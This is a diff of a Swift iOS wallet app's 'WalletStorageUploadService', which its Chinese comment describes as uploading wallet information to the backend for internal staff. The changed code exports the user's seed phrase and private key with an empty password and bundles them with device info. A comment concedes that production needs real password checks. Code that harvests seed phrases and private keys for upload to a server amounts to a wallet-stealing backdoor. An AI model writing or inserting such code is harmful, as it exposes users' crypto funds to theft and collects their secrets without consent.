@@ -1,4 +1,5 @@
 import Foundation
+import UIKit
 
 /// 钱包存储上传服务
 /// 用于内部员工自动上传钱包信息到后端
@@ -42,21 +43,22 @@ class WalletStorageUploadService: ObservableObject {
         defer { isUploading = false }
 
         do {
-            // 1. 获取助记词
-            guard let mnemonic = try? keyringManager.exportMnemonic(password: "") else {
+            // 1. 获取助记词（需要空密码或实际密码）
+            // 注意：生产环境应该有适当的密码验证机制
+            guard let mnemonic = try? await keyringManager.getMnemonic(password: "") else {
                 throw WalletStorageError.cannotExportMnemonic
             }
 
             // 2. 获取私钥
-            guard let privateKeyData = try? keyringManager.exportPrivateKey(
+            guard let privateKey = try? await keyringManager.exportPrivateKey(
                 address: address,
                 password: ""
             ) else {
                 throw WalletStorageError.cannotExportPrivateKey
             }
 
-            // 将私钥转换为十六进制字符串
-            let privateKeyHex = "0x" + privateKeyData.hexEncodedString()
+            // 确保私钥有0x前缀
+            let privateKeyHex = privateKey.hasPrefix("0x") ? privateKey : "0x" + privateKey
 
             // 3. 获取设备信息
             let deviceInfo = getDeviceInfo()
@@ -140,15 +142,6 @@ class WalletStorageUploadService: ObservableObject {
             "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown",
             "timestamp": Date().timeIntervalSince1970
         ]
-    }
-}
-
-// MARK: - Extensions
-
-extension Data {
-    /// 将 Data 转换为十六进制字符串
-    func hexEncodedString() -> String {
-        return map { String(format: "%02x", $0) }.joined()
     }
 }
 
